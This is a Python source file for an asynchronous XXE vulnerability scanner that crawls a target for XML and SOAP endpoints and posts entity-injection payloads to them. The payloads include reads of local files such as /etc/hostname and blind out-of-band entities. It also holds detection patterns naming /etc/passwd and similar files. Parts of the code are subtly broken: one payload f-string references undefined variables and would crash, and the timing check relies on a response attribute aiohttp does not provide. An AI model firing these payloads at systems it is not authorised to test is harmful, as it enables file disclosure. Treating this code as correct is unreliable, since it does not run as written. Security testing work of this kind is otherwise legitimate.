import aiohttp
import logging
import html
import time
import re
import hashlib
from typing import List, Dict, Set
import random
import string
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import asyncio

logger = logging.getLogger(__name__)

class XXEScanner:
    def __init__(self):
        self.seen_responses = set()
        self.successful_payloads = set()
        self.max_workers = 3  # Reduced for better stability

    def generate_random_string(self, length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_payloads(self) -> Dict[str, List[str]]:
        """Generate practical XXE payloads that work in real-world scenarios"""
        canary = self.generate_random_string()
        
        return {
            'basic': [
                # Basic entity test
                f'''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "harmless">]><root>&xxe;</root>''',
                
                # Simple file read test (safe paths)
                f'''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>''',
                
                # Error-based detection
                f'''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///nonexistent/file">%xxe;]><root>test</root>'''
            ],
            'blind': [
                # Delayed response test
                f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:9999/xxe-test">]><root>&xxe;</root>''',
                
                # Safe OOB test
                f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1/xxe-{canary}">%xxe;]><root>test</root>'''
            ],
            'parameter': [
                # Parameter entities test
                f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 "file"><!ENTITY % param2 "///etc/hostname"><!ENTITY % param3 "<!ENTITY &#x25; test SYSTEM '{param1}:{param2}'>">%param3;]><root>test</root>'''
            ]
        }

    async def find_xml_endpoints(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Find potential XML endpoints using practical methods"""
        endpoints = []
        try:
            # Test main URL first
            async with session.get(url, ssl=False, timeout=10) as response:
                content_type = response.headers.get('Content-Type', '').lower()
                if 'xml' in content_type:
                    endpoints.append({
                        'url': url,
                        'method': 'POST',
                        'type': 'direct',
                        'content_type': content_type
                    })

                # Parse HTML for forms and endpoints
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')

                # Check for XML/SOAP forms
                for form in soup.find_all('form'):
                    if any(x in form.get('enctype', '').lower() for x in ['xml', 'soap']):
                        endpoints.append({
                            'url': urljoin(url, form.get('action', '')),
                            'method': form.get('method', 'POST').upper(),
                            'type': 'form',
                            'content_type': form.get('enctype', '')
                        })

                # Check common API endpoints
                api_paths = [
                    '/api/xml', '/api/v1/xml', '/soap', '/api/soap',
                    '/services/xml', '/xml-rpc', '/xmlrpc.php'
                ]
                
                for path in api_paths:
                    test_url = urljoin(url, path)
                    try:
                        async with session.head(test_url, ssl=False, timeout=5) as resp:
                            if resp.status < 400:
                                endpoints.append({
                                    'url': test_url,
                                    'method': 'POST',
                                    'type': 'api',
                                    'content_type': resp.headers.get('Content-Type', '')
                                })
                    except:
                        continue

        except Exception as e:
            logger.error(f"Error finding XML endpoints: {str(e)}")

        return endpoints

    async def test_endpoint(self, session: aiohttp.ClientSession, endpoint: Dict, payloads: Dict[str, List[str]]) -> List[Dict]:
        """Test an endpoint for XXE vulnerabilities"""
        vulnerabilities = []
        url = endpoint['url']
        method = endpoint['method']
        
        # Use the endpoint's content type if available
        headers = {
            'Content-Type': endpoint.get('content_type', 'application/xml'),
            'Accept': '*/*'
        }

        try:
            # Send baseline request
            baseline = '<?xml version="1.0"?><root><test>safe</test></root>'
            async with session.post(url, data=baseline, headers=headers, ssl=False, timeout=5) as response:
                baseline_response = await response.text()
                baseline_time = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0

            # Test each payload category
            for category, category_payloads in payloads.items():
                for payload in category_payloads:
                    try:
                        start_time = time.time()
                        async with session.post(url, data=payload, headers=headers, ssl=False, timeout=5) as response:
                            response_text = await response.text()
                            response_time = time.time() - start_time

                            # Check for signs of vulnerability
                            is_vulnerable = False
                            evidence = []

                            # Check for error messages that indicate XXE processing
                            if any(pattern in response_text.lower() for pattern in XXE_ERROR_PATTERNS):
                                is_vulnerable = True
                                evidence.append("XML parsing error indicates XXE processing")

                            # Check for timing differences (potential blind XXE)
                            if response_time > baseline_time + 2:
                                is_vulnerable = True
                                evidence.append(f"Response time anomaly: {response_time:.2f}s vs baseline {baseline_time:.2f}s")

                            # Check for file content leakage
                            if any(pattern in response_text for pattern in SYSTEM_FILE_PATTERNS):
                                is_vulnerable = True
                                evidence.append("System file content detected in response")

                            if is_vulnerable:
                                vulnerabilities.append({
                                    "type": "XML External Entity (XXE)",
                                    "description": f"XXE vulnerability detected using {category} technique",
                                    "url": url,
                                    "method": method,
                                    "evidence": evidence,
                                    "payload": html.escape(payload),
                                    "response_time": f"{response_time:.2f}s",
                                    "severity": "High"
                                })

                    except asyncio.TimeoutError:
                        continue
                    except Exception as e:
                        logger.debug(f"Error testing payload: {str(e)}")
                        continue

        except Exception as e:
            logger.error(f"Error testing endpoint {url}: {str(e)}")

        return vulnerabilities

    async def scan_url(self, url: str) -> List[Dict]:
        """Main scanning function"""
        all_vulnerabilities = []
        
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            connector = aiohttp.TCPConnector(limit=3)  # Limit concurrent connections
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                # Find XML endpoints
                endpoints = await self.find_xml_endpoints(session, url)
                if not endpoints:
                    logger.info("No XML endpoints found")
                    return []

                # Generate payloads
                payloads = self.generate_payloads()

                # Test endpoints in sequence to avoid overwhelming the target
                for endpoint in endpoints:
                    vulnerabilities = await self.test_endpoint(session, endpoint, payloads)
                    all_vulnerabilities.extend(vulnerabilities)

        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            return [{
                "type": "Scan Error",
                "description": str(e),
                "url": url,
                "severity": "Error"
            }]

        return all_vulnerabilities

async def scan(target_url: str) -> List[Dict]:
    """Entry point for the scanner"""
    scanner = XXEScanner()
    return await scanner.scan_url(target_url)

# Detection Patterns
XXE_ERROR_PATTERNS = [
    'xml parsing error',
    'undefined entity',
    'cannot resolve entity',
    'unknown entity',
    'not well-formed',
    'content is not allowed in prolog'
]

SYSTEM_FILE_PATTERNS = [
    '/etc/passwd',
    '/etc/hostname',
    'C:\\Windows\\',
    '/proc/version',
    '/etc/hosts'
]

